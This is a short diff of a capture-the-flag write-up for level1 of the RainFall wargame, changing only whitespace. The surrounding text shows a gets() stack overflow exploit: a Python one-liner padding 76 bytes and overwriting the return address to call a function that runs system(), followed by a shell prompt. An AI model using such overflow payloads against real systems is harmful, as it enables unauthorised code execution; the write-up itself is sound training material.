@@ -12,7 +12,7 @@ To figure out, what we can execute, let's list all the functions in this binary 
     0x08048479 <+53>:	call   0x8048360 <system@plt>
 
 We are very lucky, it invokes `system@plt` function. So, let's invoke `run` function using `gets` vulnerability by performing stack overflow, invoking the `run` function instead of the `return` call.
-    
+
     level1@RainFall:~$ cat <(python -c "print 'A'*76 + '\x08\x04\x84\x44'[::-1]") - | ./level1
     Good... Wait what?
     whoami
